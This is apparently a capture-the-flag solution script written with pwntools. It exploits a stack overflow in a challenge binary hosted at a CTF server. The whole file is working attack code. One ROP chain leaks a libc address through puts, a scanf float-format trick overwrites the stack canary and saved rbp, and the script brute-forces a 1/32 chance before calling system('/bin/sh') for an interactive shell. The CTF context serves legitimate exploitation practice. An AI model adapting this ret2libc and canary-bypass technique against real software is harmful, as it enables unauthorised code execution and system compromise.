from pwn import *

# Gadgets
offset = 0x4100000000000000
pop_rdi = 0x00000000401313
ret = 0x0000000040101a
one = 0xe3b01
bin_sh = 0x1b45bd
gdb_script = '''b* main
b* main+101
b* 0x00000000004012ad
stack 50
'''

context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6')

while(1):
    #io = process()
    #gdb.attach(io, gdb_script, api=True)
    io = remote('win.the.seetf.sg', 2004)

    io.recvuntil(b'tale.\n')
    payload = p64(pop_rdi) + p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(ret) + p64(elf.sym['main'])
    payload = b'A'*(264-(len(payload))) + payload
    payload = payload[:-1]
    io.send(payload)

    # The scanf function use %f (4 bytes float) on a byte variable,
    # therefore overwriting the lower variables aka the canary and rbp

    # We need the last byte of rbp to be 0x50 (1/32 chance) while not
    # failing canary check
    io.recvuntil(b'number!\n')
    io.sendline(b'0.00000000000000000000000249447') # Will convert to 0x1841xxxx
    io.recvuntil(b'number!\n')
    # This will overwrite the last byte of rbp to 0x18 + bypassing the canary check
    io.sendline(b'0.00000000000000000000000249447') # Will convert to 0x1841xxxx
    io.recvuntil(b'number!\n')
    io.send(b'a') # This will skip the scanf

    log.info("End round 1")

    try: 
        # If we hit the 1/32 chance meaning that the last byte of rbp is 0x50
        # Therefore following exploit will guarantee to work
        libc.address = u64(io.recvline(keepends=False).ljust(8, b'\0')) - libc.sym['puts']
        log.info(f'Libc base: {hex(libc.address)}')

        # By the time our program return to main, the last byte of rbp will be 0x40

        io.recvuntil(b'tale.\n')
        payload = p64(pop_rdi) + p64(libc.address + bin_sh)
        payload += p64(libc.sym['system'])
        payload += p64(ret) + p64(elf.sym['main'])
        payload = b'A'*(264-(len(payload))) + payload
        payload = payload[:-1]
        io.send(payload)

        io.recvuntil(b'number!\n')
        io.sendline(b'0.000000000000000000000000000000000580790') # Will convert to 0x0841xxxx
        io.recvuntil(b'number!\n')
        # This will overwrite the last byte of rbp to 0x08 + bypassing the canary check
        io.sendline(b'0.000000000000000000000000000000000580790') # Will convert to 0x0841xxxx
        io.recvuntil(b'number!\n')
        io.send(b'a') # This will skip the scanf
        log.info("End round 2")

        #io.sendline('ls -la')

        io.interactive()
    except:
        log.info("Brute Failed!")
        io.close()
